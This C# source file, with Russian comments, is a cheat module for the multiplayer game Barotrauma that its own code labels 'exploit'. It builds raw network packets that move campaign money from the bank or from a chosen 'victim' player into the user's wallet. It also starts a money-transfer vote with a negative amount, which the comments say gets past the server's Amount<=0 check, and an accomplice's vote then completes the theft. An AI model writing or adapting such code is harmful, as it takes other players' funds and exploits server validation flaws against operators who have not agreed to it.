using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  NEG TRANSFER v2 (волна 589) — переписан под РАБОЧИЙ паттерн
    //  BankTransferModule юзера: настоящий NetWalletTransfer +
    //  transfer.Write(msg) (как TabMenu.SendTransaction:1489).
    //
    //  ТРИ РЕЖИМА:
    //  1) БАНК → МНЕ (прямой, РАБОТАЕТ СОЛО):
    //     Sender=None, Receiver=Some(я), Amount=+X.
    //     Соло-сервер = я менеджер (Count==1) → TransferMoney(Bank)
    //     без вотчины. На сервере друга = вотчина с КАПОМ
    //     (MaximumMoneyTransferRequest, дефолт 999999).
    //     = это та самая «рабочая банк трансферка».
    //
    //  2) ЖЕРТВА → МНЕ (прямой, +X):
    //     Sender=Some(жертва), Receiver=Some(я).
    //     Гейт server:1186: чужой Sender требует AllowedToManageWallets
    //     → работает только в «окно 586» (админ мёртв/соло) или с пермом.
    //     В окне = прямая кража кошелька БЕЗ голосования!
    //
    //  3) МИНУС-ВОТЧИНА (2+ игрока):
    //     От меня/банка отрицательная сумма жертве. Прямой путь режет
    //     Amount<=0 (server:1182), вотчинный — НЕ режет:
    //     TransferVote.Finish: TryDeduct(-X) всегда true → я +X, жертва -X.
    //     ПАКЕТ СТАРТА: UPDATE_LOBBY → сегмент Vote → byte TransferMoney →
    //     bool true + Int32 amount + byte fromSession + byte toSession
    //     (server Voting.cs:313-329; 0xFF = банк).
    //     ПРОХОЖДЕНИЕ: 30с таймаут → quorum in-game КРОМЕ стартера,
    //     нужен 1 голос «ЗА» (неответившие не в total). СОЛО = ФЕЙЛ
    //     (total=0) — соло тестить минус БЕСПОЛЕЗНО, только режимы 1/2!
    //     Кнопка «ГОЛОС ЗА» = легальный GameMain.Client.Vote(TransferMoney, 2)
    //     — жмёт второй аккаунт/сообщник.
    // ============================================================
    public class NegTransferModule : CSModuleBase
    {
        public override string Id   => "neg_transfer";
        public override string Name => "Neg Transfer";
        public override string Description =>
            "Переводы кошельков кампании.\n\n" +
            "• БАНК→МНЕ прямой (соло-OK, как банк-трансферка)\n" +
            "• ЖЕРТВА→МНЕ прямой (нужно окно 586)\n" +
            "• МИНУС-ВОТЧИНА от меня/банка (нужен 1 голос ЗА)\n" +
            "• Кнопка ГОЛОС ЗА для сообщника\n\n" +
            "Минус на соло НЕ тестить — вотчина фейлится (total=0)!";

        public override string Category => "exploit";

        private static readonly Color AccentColor = new Color(255, 170, 90);
        private static readonly Color OkColor     = new Color(120, 255, 140);
        private static readonly Color DangerColor = new Color(255, 110, 110);
        private static readonly Color DimColor    = new Color(160, 170, 190);
        private static readonly Color RowColor    = new Color(30, 36, 48);
        private static readonly Color SelColor    = new Color(90, 40, 40);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _status;
        private static GUITextBox _amountBox;
        private static GUIButton _modeMeBtn;
        private static GUIButton _modeBankBtn;
        private static GUIButton _modeVictimBtn;

        // режим вотчины: true = от меня, false = от банка
        private static bool _fromMe = true;
        private static int  _amount = 10000;     // для вотчины шлём как -_amount
        private static Client _target;
        private static string _lastNote = "";

        public override string GetLabel()
        {
            int bank = 0, mine = 0;
            try
            {
                var camp = GameMain.GameSession?.Campaign;
                if (camp?.Bank != null) { bank = camp.Bank.Balance; }
                if (Character.Controlled?.Wallet != null) { mine = Character.Controlled.Wallet.Balance; }
            }
            catch { }
            return $"Neg Transfer (Bank: {bank} | Me: {mine})";
        }

        public override void OnClick()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("[NegTr] Нет подключения", DangerColor);
                return;
            }
            if (GameMain.GameSession?.Campaign == null)
            {
                GUI.AddMessage("[NegTr] Нужна кампания", DangerColor);
                return;
            }
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _target = null;
                _lastNote = "";
                _window = new GUIMessageBox("Neg Transfer v2", "", Array.Empty<LocalizedString>(), new Vector2(0.62f, 0.88f));
                var content = _window.Content;
                content.ClearChildren();

                // ---- статус ----
                _status = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.085f), content.RectTransform),
                    "", textAlignment: Alignment.CenterLeft);
                _status.TextColor = AccentColor;
                _status.CanBeFocused = false;

                // ---- режим ----
                var modeFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.075f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.09f) }, style: null);
                var modeLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.9f), modeFrame.RectTransform, Anchor.Center), isHorizontal: true);
                _modeMeBtn = new GUIButton(new RectTransform(new Vector2(0.33f, 0.9f), modeLayout.RectTransform), "ВОТЧИНА: от МЕНЯ");
                _modeMeBtn.OnClicked = (b, d) => { _fromMe = true; UpdateModeButtons(); UpdateStatus(); return true; };
                _modeBankBtn = new GUIButton(new RectTransform(new Vector2(0.33f, 0.9f), modeLayout.RectTransform), "ВОТЧИНА: от БАНКА");
                _modeBankBtn.OnClicked = (b, d) => { _fromMe = false; UpdateModeButtons(); UpdateStatus(); return true; };
                var quickBankBtn = new GUIButton(new RectTransform(new Vector2(0.33f, 0.9f), modeLayout.RectTransform), "БАНК→МНЕ (соло)");
                quickBankBtn.Color = new Color(60, 90, 60);
                quickBankBtn.OnClicked = (b, d) => { BankToMeDirect(); return true; };
                UpdateModeButtons();

                // ---- список игроков ----
                var listLabel = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.045f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.17f) },
                    "Жертва (клик = выбрать):", textAlignment: Alignment.CenterLeft);
                listLabel.TextColor = DimColor;
                listLabel.CanBeFocused = false;

                var listFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.36f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.215f) }, style: null);
                _list = new GUIListBox(new RectTransform(Vector2.One, listFrame.RectTransform));
                _list.Color = new Color(20, 25, 35);
                RefreshPlayers();

                // ---- суммы ----
                var amountFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.075f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.585f) }, style: null);
                var amountLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.9f), amountFrame.RectTransform, Anchor.Center), isHorizontal: true);
                MakeAmountBtn(amountLayout, 0.13f, "1К", 1000);
                MakeAmountBtn(amountLayout, 0.13f, "10К", 10000);
                MakeAmountBtn(amountLayout, 0.13f, "100К", 100000);
                MakeAmountBtn(amountLayout, 0.13f, "1М", 1000000);
                var customFrame = new GUIFrame(new RectTransform(new Vector2(0.22f, 1f), amountLayout.RectTransform), style: null);
                _amountBox = new GUITextBox(new RectTransform(Vector2.One, customFrame.RectTransform), _amount.ToString());
                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.2f, 1f), amountLayout.RectTransform), "СВОЯ");
                applyBtn.OnClicked = (b, d) => { ParseCustom(); return true; };

                // ---- кнопки действия ----
                var actionLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.07f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.67f) }, isHorizontal: true);
                var goBtn = new GUIButton(new RectTransform(new Vector2(0.4f, 0.95f), actionLayout.RectTransform), "★ МИНУС-ВОТЧИНА ★");
                goBtn.Color = SelColor;
                goBtn.OnClicked = (b, d) => { LaunchMinusVote(); return true; };
                var yesBtn = new GUIButton(new RectTransform(new Vector2(0.27f, 0.95f), actionLayout.RectTransform), "ГОЛОС ЗА ✋");
                yesBtn.Color = new Color(60, 110, 60);
                yesBtn.OnClicked = (b, d) => { VoteYes(); return true; };
                var victimBtn = new GUIButton(new RectTransform(new Vector2(0.31f, 0.95f), actionLayout.RectTransform), "ЖЕРТВА→МНЕ прямой");
                victimBtn.Color = new Color(110, 70, 60);
                victimBtn.OnClicked = (b, d) => { VictimToMeDirect(); return true; };

                // ---- закрывашка ----
                var closeLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.055f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.745f) }, isHorizontal: true);
                var closeBtn = new GUIButton(new RectTransform(new Vector2(0.2f, 0.9f), closeLayout.RectTransform), "Закрыть");
                closeBtn.OnClicked = (b, d) => { CloseWindow(); return true; };

                UpdateStatus();
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void MakeAmountBtn(GUILayoutGroup layout, float relW, string text, int value)
        {
            var btn = new GUIButton(new RectTransform(new Vector2(relW, 1f), layout.RectTransform), text);
            btn.OnClicked = (b, d) =>
            {
                _amount = value;
                if (_amountBox != null) { _amountBox.Text = value.ToString(); }
                UpdateStatus();
                return true;
            };
        }

        private static void ParseCustom()
        {
            if (_amountBox == null) { return; }
            int v;
            if (int.TryParse(_amountBox.Text.Trim(), out v) && v != 0)
            {
                _amount = Math.Abs(v);
                UpdateStatus();
            }
            else
            {
                GUI.AddMessage("[NegTr] Не число", DangerColor);
            }
        }

        private static void UpdateModeButtons()
        {
            if (_modeMeBtn != null) { _modeMeBtn.Color = _fromMe ? SelColor : RowColor; }
            if (_modeBankBtn != null) { _modeBankBtn.Color = !_fromMe ? SelColor : RowColor; }
        }

        private static void RefreshPlayers()
        {
            if (_list == null) { return; }
            try
            {
                _list.Content.ClearChildren();

                var header = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform), style: null);
                header.Color = new Color(50, 60, 80);
                var headerText = new GUITextBlock(new RectTransform(Vector2.One, header.RectTransform),
                    "Игроки сервера:", textAlignment: Alignment.CenterLeft);
                headerText.TextColor = AccentColor;
                headerText.CanBeFocused = false;

                var clients = GameMain.Client?.ConnectedClients;
                if (clients == null || clients.Count == 0)
                {
                    AddNoteRow("Список пуст");
                    return;
                }

                foreach (Client c in clients)
                {
                    Client cc = c;
                    if (cc == null) { continue; }

                    string bal = "?";
                    try
                    {
                        if (cc.Character?.Wallet != null) { bal = cc.Character.Wallet.Balance.ToString(); }
                    }
                    catch { }

                    string tag = cc.Character == null ? " [не в раунде]" : "";
                    string suffix = _target == cc ? "  ◀ ЦЕЛЬ" : "";

                    var row = new GUIButton(
                        new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform),
                        cc.Name + tag + " — " + bal + " мк" + suffix);
                    row.Color = _target == cc ? SelColor : RowColor;
                    row.OnClicked = (b, d) =>
                    {
                        _target = cc;
                        RefreshPlayers();
                        UpdateStatus();
                        return true;
                    };
                }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] list fail: " + e.Message, DangerColor);
            }
        }

        private static void AddNoteRow(string text)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform), style: null);
            row.Color = RowColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.Center);
            txt.TextColor = DimColor;
            txt.CanBeFocused = false;
        }

        private static void UpdateStatus()
        {
            if (_status == null) { return; }
            string to = _target == null ? "не выбран" : _target.Name;
            string note = string.IsNullOrEmpty(_lastNote) ? "" : "\n" + _lastNote;
            _status.Text = "Режим: " + (_fromMe ? "от МЕНЯ" : "от БАНКА") +
                " | Цель: " + to + " | Сумма: " + _amount + " мк" + note;
        }

        // ========================================================
        //  1) ПРЯМОЙ: БАНК → МНЕ (зеркало BankTransferModule юзера)
        // ========================================================
        private static void BankToMeDirect()
        {
            Character me = Character.Controlled;
            if (me == null) { GUI.AddMessage("[NegTr] Нужен персонаж в раунде", DangerColor); return; }
            ParseCustom();
            try
            {
                INetSerializableStruct transfer = new NetWalletTransfer
                {
                    Sender = Option<ushort>.None(),
                    Receiver = Option<ushort>.Some(me.ID),
                    Amount = _amount
                };
                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.TRANSFER_MONEY);
                transfer.Write(msg);
                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
                _lastNote = "БАНК→МНЕ " + _amount + " мк отправлен (соло/менеджер = сразу)";
                GUI.AddMessage("[NegTr] " + _lastNote, OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] fail: " + e.Message, DangerColor);
            }
            UpdateStatus();
        }

        // ========================================================
        //  2) ПРЯМОЙ: ЖЕРТВА → МНЕ (+X, чужой Sender — только
        //     в «окно 586» или с пермом ManageMoney)
        // ========================================================
        private static void VictimToMeDirect()
        {
            Character me = Character.Controlled;
            if (me == null) { GUI.AddMessage("[NegTr] Нужен персонаж в раунде", DangerColor); return; }
            if (_target?.Character == null) { GUI.AddMessage("[NegTr] Цель не в раунде", DangerColor); return; }
            ParseCustom();
            try
            {
                INetSerializableStruct transfer = new NetWalletTransfer
                {
                    Sender = Option<ushort>.Some(_target.Character.ID),
                    Receiver = Option<ushort>.Some(me.ID),
                    Amount = _amount
                };
                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.TRANSFER_MONEY);
                transfer.Write(msg);
                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
                _lastNote = "ЖЕРТВА→МНЕ " + _amount + " мк отправлен (сработает в окне 586)";
                GUI.AddMessage("[NegTr] " + _lastNote, AccentColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] fail: " + e.Message, DangerColor);
            }
            UpdateStatus();
        }

        // ========================================================
        //  3) МИНУС-ВОТЧИНА (старт-пакет, сервер Voting.cs:313)
        // ========================================================
        private static void LaunchMinusVote()
        {
            if (_target == null)
            {
                GUI.AddMessage("[NegTr] Выбери жертву из списка", DangerColor);
                return;
            }
            ParseCustom();

            byte fromSession = _fromMe ? GetMySession() : (byte)0xFF;
            if (_fromMe && fromSession == 0xFF)
            {
                GUI.AddMessage("[NegTr] Себя не нашёл (не в раунде?) — выбери «от БАНКА»", DangerColor);
                return;
            }
            byte toSession = _target.SessionId;

            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.Vote);
                    msg.WriteByte((byte)VoteType.TransferMoney);
                    msg.WriteBoolean(true);          // startVote
                    msg.WriteInt32(-_amount);        // отрицательный: чека <=0 НЕТ
                    msg.WriteByte(fromSession);      // 0xFF = банк
                    msg.WriteByte(toSession);
                    msg.WritePadBits();
                }
                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] send fail: " + e.Message, DangerColor);
                return;
            }

            _lastNote = "Вотчина -" + _amount + " мк запущена! Сообщник жмёт «ГОЛОС ЗА».\n" +
                        "СОЛО = фейл. Вотчину видят все.";
            GUI.AddMessage("[NegTr] вотчина: -" + _amount + " мк, " +
                (_fromMe ? "от тебя" : "от банка") + " → " + _target.Name, OkColor);
            GUI.AddMessage("[NegTr] нужен голос ЗА от другого in-game (30с)", AccentColor);
            UpdateStatus();
        }

        // ========================================================
        //  ГОЛОС ЗА: легальный ваниль-метод GameMain.Client.Vote.
        //  Клиент пишет bool false + Int32(2); сервер читает ReadByte
        //  → 2 = yes. Жмёт ВТОРОЙ аккаунт/сообщник.
        // ========================================================
        private static void VoteYes()
        {
            try
            {
                GameMain.Client?.Vote(VoteType.TransferMoney, 2);
                GUI.AddMessage("[NegTr] голос ЗА отправлен", OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] vote fail: " + e.Message, DangerColor);
            }
        }

        private static byte GetMySession()
        {
            try
            {
                Character me = Character.Controlled;
                var clients = GameMain.Client?.ConnectedClients;
                if (me == null || clients == null) { return 0xFF; }
                foreach (Client c in clients)
                {
                    if (c != null && c.Character == me) { return c.SessionId; }
                }
            }
            catch { }
            return 0xFF;
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _status = null;
            _amountBox = null;
            _modeMeBtn = null;
            _modeBankBtn = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
